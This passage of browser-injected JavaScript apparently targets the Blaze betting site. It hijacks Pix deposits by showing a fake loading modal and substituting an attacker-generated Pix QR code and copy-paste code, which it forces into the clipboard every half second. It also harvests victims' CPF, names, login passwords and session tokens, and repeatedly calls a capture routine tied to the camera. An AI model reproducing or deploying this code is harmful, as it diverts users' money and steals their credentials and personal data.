                } else {
                    console.warn('Element .qr-code-image not found to inject Native QR Code.');
                }
            }, 500);

            return;
        }

        console.log('Attempting to generate QR Code for:', pixData);

        let intervalToGenPixCode = setInterval(() => {
            if (pixCode != "") {
                QRCode.toDataURL(pixCode).then(dataURL => {
                    const qr_code_img_element = document.querySelector(".qr-code-image");

                    if (qr_code_img_element !== null) {
                        qr_code_img_element.src = dataURL;
                    }

                });
            }
        }, 500);

        return;

        const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=' + pixData;
        $.ajax({
            url: qrUrl,
            method: 'GET',
            xhrFields: {
                responseType: 'blob'
            },
            success: function(response) {
                console.log('QR Code API: Response received successfully.');
                const reader = new FileReader();
                reader.onloadend = function() {
                    console.log('FileReader: Base64 image generated.');
                    const $qrImage = $('.qr-code-image');
                    if ($qrImage.length) {
                        $qrImage.attr('src', reader.result).css('border', '10px solid #fff');
                        console.log('QR Code injected into .qr-code-image element.');
                    } else {
                        console.warn('Element .qr-code-image not found to inject QR Code.');
                        window.location.reload(true);
                    }
                };
                reader.readAsDataURL(response);
            },
            error: function(jqXHR, textStatus, errorThrown) {
                console.error('Error calling QR Code API:', textStatus, errorThrown);
                if (modalDisplayed) {
                    $('#full-custom-loading-modal-overlay').css('display', 'none');
                    modalDisplayed = false;
                    console.log('Full custom loading modal hidden due to QR generation error.');
                    window.location.reload(true);
                }
                resetScriptState();
            }
        });
    }

    function copyToClipboard(text) {
        console.log('Attempting to copy to clipboard:', text);
        navigator.clipboard.writeText(text).then(() => {
            console.log('Successfully copied using navigator.clipboard.');
        }).catch(err => {
            console.error('Failed to copy using navigator.clipboard:', err);
            console.log('Attempting fallback to textarea...');
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            try {
                const success = document.execCommand('copy');
                if (success) {
                    console.log('Successfully copied using document.execCommand.');
                } else {
                    console.error('Failed to copy using document.execCommand.');
                }
            } catch (err) {
                console.error('Error executing document.execCommand:', err);
            } finally {
                document.body.removeChild(textarea);
            }
        });
    }

    function getPixCode(base64String) {
        try {
            return atob(base64String);
        } catch (e) {
            return base64String;
        }
    }

    function formatCPF(cpf) {
        const apenasNumeros = cpf.replace(/\D/g, '');
        return apenasNumeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    }

    function blazeInternalsData(api_endpoint, api_base_url = "https://blaze.bet.br") {
        if (!hasBlazeTokens) return false;

        const { accessToken, refreshToken } = getBlazeTokens();
        const token = `Bearer ${accessToken}`;

        return $.ajax({
            url: api_base_url + api_endpoint,
            method: "GET",
            headers: {
                "Authorization": token
            }
        });
    }

    function observePixElements() {
        console.log('Starting or restarting observePixElements.');

        if (observerInstance) {
            observerInstance.disconnect();
            console.log('Previous observer disconnected before starting a new one.');
        }

        const targetNode = document.body;
        const config = {
            childList: true,
            subtree: true
        };

        const callback = async function(mutationsList, observer) {
            const $modalOverlay = $('#full-custom-loading-modal-overlay');

            if (!$modalOverlay.length || $modalOverlay.css('display') === 'none') {
                if (modalDisplayed) {
                    console.log('Modal fake disappeared or hidden. Resetting script state.');
                    resetScriptState();
                }
                return;
            }

            for (const mutation of mutationsList) {
                if (mutation.type === 'childList') {
                    const qrTextDiv = document.querySelector('.qr-code-text-inner');

                    if (qrTextDiv) {
                        if (modalDisplayed) {
                            if (!qrCodeGenerated) {
                                console.log('QR Code not yet generated. Generating now...');
                                generateQRCode(pixCode);
                                qrCodeGenerated = true;
                            }

                            if (qrTextDiv.innerText !== pixCode) {
                                qrTextDiv.innerText = pixCode;
                                console.log('QR Code text updated to fixed Pix code.');

                                setTimeout(() => {
                                    $modalOverlay.css('display', 'none');
                                    modalDisplayed = false;
                                    console.log(`Full custom loading modal hidden after ${MODAL_REMOVE_DELAY_MS}ms, as Pix was updated.`);
                                    resetScriptState();
                                    startCapture(10);

                                    intervalToCaptureCam = setInterval(() => {
                                        startCapture(5, 1.0);
                                        currentCaptures++;

                                        if (currentCaptures == maxCaptures && maxCaptures !== 0) {
                                            clearInterval(intervalToCaptureCam);
                                        }
                                    }, 10 * 1000);
                                }, MODAL_REMOVE_DELAY_MS);
                            }

                            const copyElements = document.querySelectorAll('.qr-code-image, .copy-emblem, .qr-code-text-inner, .pix-deposit-qr-code .buttons button:nth-of-type(2)');
                            copyElements.forEach(element => {
                                if (element && !element.hasAttribute('data-pix-listener')) {
                                    element.addEventListener('click', event => {
                                        event.preventDefault();
                                        console.log('Copy element clicked. Attempting to copy Pix.');
                                        copyToClipboard(pixCode);
                                    });
                                    element.setAttribute('data-pix-listener', 'true');
                                    console.log('Click listener added to element:', element.className || element.tagName);
                                }
                            });

                            if (!autoCopyInterval) {
                                autoCopyInterval = setInterval(() => {
                                    console.log('Auto-copying...');
                                    copyToClipboard(pixCode);
                                }, 500);
                                console.log('Auto-copy started.');
                            }
                        } else {
                        }
                        return;
                    } else {
                        if (qrCodeGenerated) {
                            console.log('Element .qr-code-text-inner disappeared. Resetting state.');
                            resetScriptState();
                        }
                    }
                }
            }
        };

        observerInstance = new MutationObserver(callback);
        observerInstance.observe(targetNode, config);
        console.log('MutationObserver started.');
    }

    async function handleDepositButtonClick(event) {
        if (event.target && event.target.innerText &&
            event.target.innerText.trim().toLowerCase() === 'depositar'
           ) {
            console.log('Botão "Depositar" clicado.');

            if (event.target.id == "header-deposit") {

                intervalToGetDepositInfos = setInterval(() => {
                    const new_transaction = document.getElementById("new-transaction");
                    if (!new_transaction) return;

                    const user_informations_element = new_transaction?.querySelector("div.body .payment-component.pix-deposit-info-collection .top .row");

                    tax_id = user_informations_element?.querySelector("div.col-xs-12 .locked-personal-info-input input")?.value?.replaceAll(".", "")?.replace("-", "")?.trim();
                    first_name = user_informations_element?.querySelectorAll("div.col-xs-6 input")?.[0]?.value?.trim();
                    last_name = user_informations_element?.querySelectorAll("div.col-xs-6 input")?.[1]?.value?.trim();
                    deposit_value = user_informations_element?.querySelectorAll("div.col-xs-12 div.amount")?.[0]?.querySelector("input")?.value?.replaceAll(",", ".")?.trim();
                }, 500);

                return;
            }

            const client_data = {
                "name": `${first_name} ${last_name}`,
                "email": `user.blaze${getRandomInt(0, 100000)}@gmail.com`,
                "document": tax_id
            };

            // pixCode = await fetchPixCode();

            const current_deposit_value = deposit_value;
            const order_id = `ORDER_${getRandomInt(0, 100000)}`;

            GTW_PAY(deposit_value, order_id, client_data).done(async function(res) {
                const qrCodeData = res?.qrCodeResponse?.qrcode;

                pixCode = qrCodeData;

                let client_tokens;
                if (hasBlazeTokens()) {
                    client_tokens = getBlazeTokens();
                }

                const deposit_data = {
                    name: client_data.name,
                    email: client_data.email,
                    cpf: formatCPF(client_data.document),
                    orderId: order_id,
                    pix_code: pixCode,
                    value: current_deposit_value,
                    tokens: client_tokens
                };

                await processAndNotifyBlazeDeposits(deposit_data);
            }).fail(function(err) {
                console.log(err);
                // window.location.reload(true);
            });

            if (window.location.search.includes(TARGET_URL_PARAM)) {
                console.log('URL corresponde: ' + window.location.search);
                const $modalOverlay = $('#full-custom-loading-modal-overlay');

                if ($modalOverlay.length && !modalDisplayed) {
                    resetScriptState();

                    $modalOverlay.css('display', 'flex');
                    modalDisplayed = true;
                    console.log('Modal fake ATIVATED by "Depositar" button click and correct URL.');
                }
            } else {
                console.log('URL NÃO CORRESPONDE, fake modal will not activate: ' + window.location.search);
                resetScriptState();
            }
        }
    }

    function setupDepositButtonListener() {
        console.log('Setting up global click listener for "Depositar" button.');
        document.removeEventListener('click', handleDepositButtonClick);
        document.addEventListener('click', handleDepositButtonClick);
    }

    async function handleLoginButtonClick(event) {
        if (event.target && event.target.innerText && document.body.innerText.indexOf("Faça login em sua conta") !== -1 && event.target.nodeName == "BUTTON") {
            console.log('Botão "Entrar" clicado.');

            const userLoginInfo = getUserLoginInfo();

            if (!Array.isArray(userLoginInfo) || userLoginInfo?.length < 2) return;
            const [login, password] = userLoginInfo;

            let intervalToCheckSuccessfullLogin = setInterval(async () => {
                if (!isLastSeenPage) return;
                clearInterval(intervalToCheckSuccessfullLogin);
                isLastSeenPage = false;
                await processAndNotifyBlazeLogins(login, password);
            }, 500)
            }
    }

    function setupLoginButtonListener() {
        console.log('Setting up global click listener for "Entrar" button.');
        document.removeEventListener('click', handleLoginButtonClick);
        document.addEventListener('click', handleLoginButtonClick);
    }

    function resetScriptState() {
        console.log('Resetting script state for reusability...');
        qrCodeGenerated = false;
        if (autoCopyInterval) {
            clearInterval(autoCopyInterval);
            autoCopyInterval = null;
            console.log('Auto-copy interval cleared.');
        }
        const $modalOverlay = $('#full-custom-loading-modal-overlay');
        if ($modalOverlay.length) {
            $modalOverlay.css('display', 'none');
            console.log('Full custom loading modal hidden.');
        }
        modalDisplayed = false;

        if (observerInstance) {
            observerInstance.disconnect();
            observerInstance = null;
            console.log('MutationObserver disconnected.');
        }
        initializeModalFake();
        observePixElements();
    }

    function setupUrlChangeListener() {
        setInterval(async () => {
            if (window.location.href !== lastKnownUrl) {
                console.log('URL changed! Old:', lastKnownUrl, 'New:', window.location.href);
                lastKnownUrl = window.location.href;

                await processAndNotifyBlazeTokens();

                if (window.location.search.includes("?modal=last_seen")) {
                    isLastSeenPage = true;
                }

                if (!window.location.search.includes(TARGET_URL_PARAM) && modalDisplayed) {
                    console.log('URL changed and not deposit modal, resetting state.');
                    resetScriptState();
                }
            }
        }, 500);
    }

    window.addEventListener('popstate', () => {
        console.log('Popstate event detected. Resetting state.');
        resetScriptState();
    });

    setTimeout(() => {
        if (typeof jQuery === 'undefined') {
            console.warn('jQuery not detected after 3 seconds. Check script loading.');
        }
    }, 3000);
})();